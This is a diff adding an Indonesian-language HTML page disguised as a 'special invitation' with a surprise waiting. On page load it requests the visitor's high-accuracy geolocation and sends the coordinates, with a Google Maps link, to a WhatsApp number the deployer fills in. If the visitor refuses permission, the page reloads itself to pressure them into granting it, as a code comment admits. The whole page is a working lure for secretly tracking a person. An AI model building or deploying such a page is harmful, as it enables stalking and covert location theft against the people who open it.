@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Undangan Spesial</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f8f9fa;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 90%;
+            max-width: 600px;
+            background: #ffffff;
+            padding: 20px;
+            margin: 50px auto;
+            border-radius: 10px;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        h2 {
+            color: #333;
+        }
+        p {
+            color: #555;
+            font-size: 18px;
+        }
+        .loading {
+            font-size: 20px;
+            font-weight: bold;
+            color: #ff4500;
+            margin-top: 20px;
+        }
+    </style>
+    <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError, { enableHighAccuracy: true });
+            } else {
+                alert("Perangkat ini tidak mendukung pelacakan lokasi.");
+            }
+        }
+
+        function sendLocation(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            var accuracy = position.coords.accuracy;
+            var message = "Lokasi saat ini: https://www.google.com/maps?q=" + latitude + "," + longitude + "\nAkurasi: " + accuracy + " meter.";
+
+            // Kirim ke WhatsApp (ganti nomor dengan milikmu)
+            window.location.href = "https://wa.me/628XXXXXXXXXX?text=" + encodeURIComponent(message);
+        }
+
+        function showError(error) {
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    alert("Anda harus mengaktifkan lokasi untuk melanjutkan!");
+                    location.reload(); // Refresh halaman agar dia harus izinkan lokasi
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    alert("Informasi lokasi tidak tersedia.");
+                    break;
+                case error.TIMEOUT:
+                    alert("Gagal mendapatkan lokasi. Coba lagi.");
+                    break;
+                case error.UNKNOWN_ERROR:
+                    alert("Terjadi kesalahan yang tidak diketahui.");
+                    break;
+            }
+        }
+    </script>
+</head>
+<body onload="getLocation()">
+    <div class="container">
+        <h2>🎉 Selamat! Anda Mendapatkan Undangan Spesial 🎉</h2>
+        <p>Mohon tunggu sebentar, kami sedang menyiapkan kejutan untuk Anda...</p>
+        <p class="loading">🔍 Sedang mengambil lokasi...</p>
+    </div>
+</body>
+</html>
